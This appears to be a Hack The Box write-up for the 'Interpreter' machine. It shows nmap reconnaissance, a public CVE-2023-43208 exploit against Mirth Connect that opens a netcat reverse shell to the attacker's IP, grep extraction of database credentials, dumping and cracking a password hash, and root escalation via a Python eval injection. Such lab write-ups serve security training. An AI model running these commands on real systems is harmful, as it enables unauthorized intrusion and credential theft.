# HTB-interpreter

We will begin this machine by using Nmap to scan the server for all open TCP ports, service versions and perform script scanning:

```bash
nmap -p0-65535 -sCV 10.129.89.231
```
### Results

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp   open  http     Jetty
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mirth Connect Administrator
443/tcp  open  ssl/http Jetty
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mirth Connect Administrator
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
|_ssl-date: TLS randomness does not represent time
6661/tcp open  unknown

```


Visiting the webserver on port 443, we find a Mirth Connect instance.  Clicking the Launch Mirth Connect Administrator initiates a download of the file webstart.jnlp.

<img src="Images/03-Landing-Page.png" width="600">

Viewing webstart.jnlp using vim, reveals that we are working with Mirth Connect Administrator 4.4.0:
 
```jnlp
<jnlp codebase="http://10.129.89.231:80" version="4.4.0">
    	
    <information>
        		
        <title>Mirth Connect Administrator 4.4.0</title>
```

Searching for exploits related to this version of Mirth Connect returns the following exploit, found here: https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc.

<img src="Images/05-Google-Search.png" width="600">

Preparing and executing the payload provides us with a shell on the server:

#### Start a listener:

```
nc -lvnp 4444
```

#### Download the exploit:

```
git clone https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc
```

#### Execute the exploit:
```
python3 CVE-2023-43208.py -u https://10.129.89.231/ -c 'busybox nc 10.10.14.16 4444 -e /bin/bash'
```

#### Output:
```
Listening on 0.0.0.0 4444
Connection received on 10.129.89.231 57956
id
uid=103(mirth) gid=111(mirth) groups=111(mirth)
```

We then use the following commands to stabilize the shell:

```bash
python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
export TERM=xterm
ctrl-z
stty raw -echo; fg
```

At this point we want to identify any related files of interest for the underlying Mirth Connect technology. After some research we discover the following file which contains database credentials:

#### Extract creds with grep:

```
grep -i  'url\|user\|pass' /usr/local/mirthconnect/conf/mirth.properties
```

#### Output:

```
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = MirthPass123!
```

Using SS, we discover that there is a running SQL server on port 3306:

#### Execute SS:

```
ss -ltnp
```

#### Output:

```
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                          
LISTEN 0      50           0.0.0.0:80         0.0.0.0:*    users:(("java",pid=3524,fd=327))
LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                    
LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*                                    
LISTEN 0      50           0.0.0.0:443        0.0.0.0:*    users:(("java",pid=3524,fd=331))
LISTEN 0      128        127.0.0.1:54321      0.0.0.0:*                                    
LISTEN 0      256          0.0.0.0:6661       0.0.0.0:*    users:(("java",pid=3524,fd=335))
LISTEN 0      128             [::]:22            [::]:* 
```

With this information, we connect to the SQL server using MariaDB and discover an encrypted password:

#### Connecting to database:

We use the password: MirthPass123!

```bash
mariadb -h localhost -P 3306 -u mirthdb -p mc_bdd_prod
```

```bash
show databases;
use mc_bdd_prod;
show tables;
```

#### Output:

```
+-----------------------+
| Tables_in_mc_bdd_prod |
+-----------------------+
| ALERT                 |
| CHANNEL               |
| CHANNEL_GROUP         |
| CODE_TEMPLATE         |
| CODE_TEMPLATE_LIBRARY |
| CONFIGURATION         |
| DEBUGGER_USAGE        |
| D_CHANNELS            |
| D_M1                  |
| D_MA1                 |
| D_MC1                 |
| D_MCM1                |
| D_MM1                 |
| D_MS1                 |
| D_MSQ1                |
| EVENT                 |
| PERSON                |
| PERSON_PASSWORD       |
| PERSON_PREFERENCE     |
| SCHEMA_INFO           |
| SCRIPT                |
+-----------------------+
```

#### Password extraction:

```bash
select * from PERSON_PASSWORD;
```

#### Output:

```
+-----------+----------------------------------------------------------+---------------------+
| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
+-----------+----------------------------------------------------------+---------------------+
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
+-----------+----------------------------------------------------------+---------------------+
```

Using AI to research the encrypted password, we discover that it uses the PBKDF2-HMAC-SHA256 algorithm:

<img src="Images/14-Hash-Algorithm.png" width="600">

We can recover the plaintext value by splitting the ciphertext into a base64 salt and a base64 hash:

<img src="Images/15-Hashcat-Prep.png" width="600">

And then running Hashcat using mode 10900:

<img src="Images/16-Hashcat-Crack1.png" width="600">

Which eventually identifies the plaintext password:

<img src="Images/16-Hashcat-Crack2.png" width="600">

With this, we can now use SSH to log into the system as the Sedric user:

<img src="Images/17-Sedric-SSH.png" width="600">

Listing the running root processes, we discover the unusual file notif.py:

<img src="Images/18-Processes-1.png" width="600">

[…]

<img src="Images/19-Processes-2.png" width="600">

This reveals an application running locally on port 54321:

<img src="Images/20-Notif.png" width="600">

We will therefore port forward to access the application locally:

<img src="Images/21-Port-Forwarding.png" width="600">

Looking closely at the code, we discover that the application is using eval:

<img src="Images/22-Python-Eval.png" width="600">

Eval is dangerous because it executes strings as if they are programming code. Leveraging this, we can craft some exploit code, possibly using AI, to exploit this script and elevate ourselves to the root user. First, we will test our hypothesis to see if we can actually execute Python code:

<img src="Images/23-addPatient-Test.png" width="600">

This proves successful, however, regex is preventing us from entering certain characters, including a space. This prevents us from executing a reverse shell:

<img src="Images/24-addPatient-Reverse-Shell-1.png" width="600">

A solution here is to use a Base64 encoded payload and then decode and execute the contents in the code block:

<img src="Images/25-Payload-B64.png" width="600">

<img src="Images/26-addPatient-Reverse-Shell-2.png" width="600">

The code successfully executes and we catch a root shell on our listener:

<img src="Images/27-Root-Shell.png" width="600">
